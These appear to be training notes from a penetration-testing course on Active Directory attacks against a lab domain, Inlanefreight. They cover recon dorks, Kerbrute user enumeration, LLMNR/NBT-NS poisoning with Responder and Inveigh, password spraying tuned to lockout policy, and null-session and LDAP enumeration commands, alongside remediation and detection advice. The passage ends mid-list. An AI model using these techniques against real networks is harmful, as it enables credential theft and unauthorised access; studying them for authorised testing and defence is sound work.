# Active Directory Enumeration & Attacks

## External Recon and Enumeration Principles
Before kicking off any pentest, it can be beneficial to perform external reconnaissance of your target. This can serve many different functions, such as:
 * Validating information provided to you in the scoping document from the client
 * Ensuring you are taking actions against the appropriate scope when working remotely
 * Looking for any information that is publicly accessible that can affect the outcome of your test, such as leaked credentials

We may also dive as deep as scanning GitHub repositories for credentials left in code pushes, hunting in documents for links to an intranet or remotely accessible sites, and just looking for any information that can key us in on how the enterprise environment is configured.

## What Are We Looking For?

When conducting our external reconnaissance, there are several key items that we should be looking for. This information may not always be publicly accessible, but it would be prudent to see what is out there. If we get stuck during a penetration test, looking back at what could be obtained through passive recon can give us that nudge needed to move forward, such as password breach data that could be used to access a VPN or other externally facing service.

 * **IP Space :** Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.
 * **Domain Information :**  Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)
 * **Schema Format :** Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.
 * **Data Disclosures :** For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)
 * **Breach Data :** Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.

We have addressed the why and what of external reconnaissance; let's dive into the where and how.

## Where Are We Looking?

* **ASN / IP registrars :** [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)
* **Domain Registrars & DNS :** [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.
* **Social Media :** Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.
* **Public-Facing Company Websites :** Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.
* **Cloud & Dev Storage Spaces :** [GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)
* **Breach Data Sources :** [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.


## Finding Address Spaces

The [BGP-Toolkit](https://he.net/) hosted by Hurricane Electric is a fantastic resource for researching what address blocks are assigned to an organization and what ASN they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can.


## DNS

DNS is a great way to validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like [domaintools](https://whois.domaintools.com/), and [viewdns.info](https://viewdns.info/) are great spots to start. 

## Sharepoint Admin Job Listing
Websites hosted by the organization are also great places to dig for information. We can gather contact emails, phone numbers, organizational charts, published documents, etc. These sites, specifically the embedded documents, can often have links to internal infrastructure or intranet sites that you would not otherwise know about. Checking any publicly accessible information for those types of details can be quick wins when trying to formulate a picture of the domain structure. With the growing use of sites such as GitHub, AWS cloud storage, and other web-hosted platforms, data can also be leaked unintentionally. 

Tools like [Trufflehog](https://github.com/trufflesecurity/truffleHog) and sites like [Greyhat Warfare](https://buckets.grayhatwarfare.com/) are fantastic resources for finding these breadcrumbs.

## Hunting For Files
```
filetype:pdf inurl:inlanefreight.com
```

## Hunting E-mail Addresses
```
intext:"@inlanefreight.com" inurl:inlanefreight.com
```

### Username Harvesting

We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

### Credential Hunting

[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.

```

## Initial Enumeration of the Domain

We are at the very beginning of our AD-focused penetration test against Inlanefreight. We have done some basic information gathering and gotten a picture of what to expect from the customer via the scoping documents.

### Tasks
Our tasks to accomplish for this section are:
 * Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
 * This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
 * Document any findings we come across for later use. Extremely important!

### Key Data Points

 * **AD Users :** We are trying to enumerate valid user accounts we can target for password spraying.
 * **AD Joined Computers :** Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
 * **Key Services :**  	Kerberos, NetBIOS, LDAP, DNS
 * **Vulnerable Hosts and Services :** Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)

## TTPs

Enumerating an AD environment can be overwhelming if just approached without a plan. There is an abundance of data stored in AD, and it can take a long time to sift if not looked at in progressive stages, and we will likely miss things. We need to set a game plan for ourselves and tackle it piece by piece. Everyone works in slightly different ways, so as we gain more experience, we'll start to develop our own repeatable methodology that works best for us. Regardless of how we proceed, we typically start in the same place and look for the same data points. We will experiment with many tools in this section and subsequent ones. It is important to reproduce every example and even try to recreate examples with different tools to see how they work differently, learn their syntax, and find what approach works best for us.

We will start with passive identification of any hosts in the network, followed by active validation of the results to find out more about each host (what services are running, names, potential vulnerabilities, etc.). Once we know what hosts exist, we can proceed with probing those hosts, looking for any interesting data we can glean from them. After we have accomplished these tasks, we should stop and regroup and look at what info we have. At this time, we'll hopefully have a set of credentials or a user account to target for a foothold onto a domain-joined host or have the ability to begin credentialed enumeration from our Linux attack host.

### Identifying Hosts

First, let's take some time to listen to the network and see what's going on. We can use *Wireshark* and *TCPDump* to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box." We notice some ARP requests and replies, MDNS, and other basic layer two packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.

### Start Wireshark on ea-attack01

```
sudo -E wireshark
# Write arp to see the ARP flow
 sudo tcpdump -i <interface> 
```
There is no one right way to listen and capture network traffic. There are plenty of tools that can process network data. Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as *pktmon.exe*, which was added to all editions of Windows 10.

[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.

```
sudo responder -I <interface> -A 
```

As we start Responder with passive analysis mode enabled, we will see requests flow in our session. Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.

Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. Let's see it in action.


### FPing Active Checks

Here we'll start fping with a few flags: a to show targets that are alive, s to print stats at the end of the scan, g to generate a target list from the CIDR network, and q to not show per-target results.

```
fping -asgq 172.16.5.0/23
```

The command above validates which hosts are active in the /23 network and does it quietly instead of spamming the terminal with results for each IP in the target list. We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap. From the fping command, we can see 9 "live hosts," including our attack host.

### Nmap Scanning

Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.

```
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

```
We can see from the output above that we have a potential host running an outdated operating system ( Windows 7, 8, or Server 2008 based on the output). This is of interest to us since it means there are legacy operating systems running in this AD environment. It also means there is potential for older exploits like EternalBlue, MS08-067, and others to work and provide us with a SYSTEM level shell. As weird as it sounds to have hosts running legacy software or end-of-life operating systems, it is still common in large enterprise environments. You will often have some process or equipment such as a production line or the HVAC built on the older OS and has been in place for a long time. Taking equipment like that offline is costly and can hurt an organization, so legacy hosts are often left in place. They will likely try to build a hard outer shell of Firewalls, IDS/IPS, and other monitoring and protection solutions around those systems. If you can find your way into one, it is a big deal and can be a quick and easy foothold. Before exploiting legacy systems, however, we should alert our client and get their approval in writing in case an attack results in system instability or brings a service or the host down. They may prefer that we just observe, report, and move on without actively exploiting the system.

The results of these scans will clue us into where we will start looking for potential domain enumeration avenues, not just host scanning. We need to find our way to a domain user account. Looking at our results, we found several servers that host domain services ( DC01, MX01, WS01, etc.). Now that we know what exists and what services are running, we can poll those servers and attempt to enumerate users. Be sure to use the -oA flag as a best practice when performing Nmap scans. This will ensure that we have our scan results in several formats for logging purposes and formats that can be manipulated and fed into other tools.

We need to be aware of what scans we run and how they work. Some of the Nmap scripted scans run active vulnerability checks against a host that could cause system instability or take it offline, causing issues for the customer or worse. For example, running a large discovery scan against a network with devices such as sensors or logic controllers could potentially overload them and disrupt the customer's industrial equipment causing a loss of product or capability. Take the time to understand the scans you use before running them in a customer's environment.

We will most likely return to these results later for further enumeration, so don't forget about them. We need to find our way to a domain user account or SYSTEM level access on a domain-joined host so we can gain a foothold and start the real fun. Let's dive into finding a user account.

## Identifying Users

[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the *jsmith.txt* or *jsmith2.txt* user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.

### Cloning Kerbrute GitHub Repo

```
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
ls dist/
```

### Testing the kerbrute_linux_amd64 Binary
```
./kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Enumerating Users with Kerbrute
```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### Identifying Potential Vulnerabilities

The local system account NT AUTHORITY\SYSTEM is a built-in account in Windows operating systems. It has the highest level of access in the OS and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. A SYSTEM account on a domain-joined host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.

There are several ways to gain SYSTEM-level access on a host, including but not limited to:
 * Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
 * Abusing a service running in the context of the SYSTEM account, or abusing the service account SeImpersonate privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
 * Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
 * Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window
By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:
 * Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
 * Perform Kerberoasting / ASREPRoasting attacks within the same domain.
 * Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
 * Perform token impersonation to hijack a privileged domain user account.
 * Carry out ACL attacks.

 # LLMNR/NBT-NS Poisoning - from Linux

This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!

## LLMNR & NBT-NS Primer

[Link-Local Multicast Name Resolution (LLMNR)](https://datatracker.ietf.org/doc/html/rfc4795) and [NetBIOS Name Service (NBT-NS)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.

## Quick Example - LLMNR/NBT-NS Poisoning

Let's walk through a quick example of the attack flow at a very high level:
 1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
 2. The DNS server responds, stating that this host is unknown.
 3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
 4. The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
 5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
 6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

## TTPs

We are performing these actions to collect authentication information sent over the network in the form of NTLMv1 and NTLMv2 password hashes. As discussed in the Introduction to Active Directory module, NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. We will then take the hash and attempt to crack them offline using tools such as Hashcat or John with the goal of obtaining the account's cleartext password to be used to gain an initial foothold or expand our access within the domain if we capture a password hash for an account with more privileges than an account that we currently possess.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:
 1. **Responder :** [Responder](https://github.com/lgandx/Responder) is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
 2. **Inveigh :** [Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.
 3. **Metasploit :** [Metasploit](https://www.metasploit.com/) has several built-in scanners and spoofing modules made to deal with poisoning attacks.

Responder and Inveigh can be used to attack the following protocols: LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth. 
Responder also has support for: MSSQL, DCE-RPC, FTP, POP3, IMAP, and SMTP auth.

### Starting Responder with Default Settings
```
sudo responder -I ens224 
```

### Capturing with Responder
Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode 5600 for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the Hashcat example hashes page to identify them and find the proper hash mode.

# LLMNR/NBT-NS Poisoning - from Windows
This section will explore the tool Inveigh and attempt to capture another set of credentials.

## Inveigh - Overview

 [Inveigh](https://github.com/Kevin-Robertson/Inveigh) can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth. 
We can get started with the PowerShell version as follows and then list all possible parameters. There is a wiki that lists all parameters and usage instructions.

```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).
```
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## C# Inveigh (InveighZero)

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. 

```
PS C:\htb> .\Inveigh.exe
```

### Remediation

Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), *Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay*.

There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP.

Advanced TCP/IP Settings window showing WINS addresses, LMHOSTS lookup enabled, and NetBIOS settings options.

While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
```

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

```
In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.

To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:

\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.


Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.

### Detection

It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. [This blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.

Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs 4697 and 7045 can be monitored for. Finally, we can monitor the registry key *HKLM\Software\Policies\Microsoft\Windows NT\DNSClient* for changes to the *EnableMulticast* DWORD value. A value of 0 would mean that LLMNR is disabled.


# Password Spraying Overview

Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively.

## Story Time

Password spraying can be a very effective way to gain a foothold internally. There are many times that this technique has helped me land a foothold during my assessments.

### Scenario 1

In this first example, I performed all my standard checks and could not find anything useful like an SMB NULL session or LDAP anonymous bind that could allow me to retrieve a list of valid users. So I decided to use the Kerbrute tool to build a target username list by enumerating valid domain users (a technique we will cover later in this section). To create this list, I took the jsmith.txt username list from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and combined this with results that I got from scraping LinkedIn. With this combined list in hand, I enumerated valid users with Kerbrute and then used the same tool to password spray with the common password Welcome1. I got two hits with this password for very low privileged users, but this gave me enough access within the domain to run BloodHound and eventually identify attack paths that led to domain compromise.

# Enumerating & Retrieving Password Policies

## Enumerating the Password Policy - from Linux - Credentialed
As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or *rpcclient*.

```
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

## Enumerating the Password Policy - from Linux - SMB NULL Sessions

Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.

### Using rpcclient
```
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```
### Obtaining the Password Policy using rpcclient
```
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```
Let's try this using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux/). enum4linux is a tool built around the [Samba suite of tools](https://www.samba.org/samba/docs/current/man-html/samba.7.html) nmblookup, net, rpcclient and smbclient to use for enumeration of windows hosts and domains. It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. Below we have an example output displaying information that can be provided by enum4linux. Here are some common enumeration tools and the ports they use:

```
Tool 	Ports
nmblookup 	137/UDP
nbtstat 	137/UDP
net 	139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
rpcclient 	135/TCP
smbclient 	445/TCP
```
### Using enum4linux
```
enum4linux -P 172.16.5.5
```
The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of enum4linux in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features

### Using enum4linux-ng
```
enum4linux-ng -P 172.16.5.5 -oA ilfreight # Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
```

## Enumerating Null Session - from Windows

It is less common to do this type of null session attack from Windows, but we could use the command ``` net use \\host\ipc$ "" /u:"" ``` to establish a null session from a windows machine and confirm if we can perform more of this type of attack.

### Establish a null session from windows

```
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```
### Error: Account is Disabled
```
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```

### Error: Password is Incorrect
```
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```
### Error: Account is locked out (Password Policy)
```
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as *windapsearch.py, ldapsearch, ad-ldapdomaindump.py*, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. 

### Using ldapsearch
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
# Note: In newer versions of ldapsearch, the -h parameter was deprecated in favor for -H.
```

## Enumerating the Password Policy - from Windows

If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc. Using built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it.

### Using net.exe
```
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

Here we can glean the following information:
 * Passwords never expire (Maximum password age set to Unlimited)
 * The minimum password length is 8 so weak passwords are likely in use
 * The lockout threshold is 5 wrong passwords
 * Accounts remained locked out for 30 minutes

This password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as Welcome1. The lockout threshold of 5 means that we can attempt 2-3 (to be safe) sprays every 31 minutes without the risk of locking out any accounts. If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but we should avoid locking out ANY accounts at all costs.
PowerView is also quite handy for this:


```
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```
PowerView gave us the same output as our *net accounts* command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).

As with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, whether it is our attack system or a system provided by the client. PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, and other potential restrictions on the target host. Let's cover a few examples.


## Analyzing the Password Policy

We've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.

 * The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
 * The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
 * The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
 * Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
 * Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (Password1 or Welcome1 would satisfy the "complexity" requirement here, but are still clearly weak passwords).

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
```
Policy 	Default Value
Enforce password history 	24 days
Maximum password age 	42 days
Minimum password age 	1 day
Minimum password length 	7
Password must meet complexity requirements 	Enabled
Store passwords using reversible encryption 	Disabled
Account lockout duration 	Not set
Account lockout threshold 	0
Reset account lockout counter after 	Not set
```

# Password Spraying - Making a Target User List
## Detailed User Enumeration
To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:
 * By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
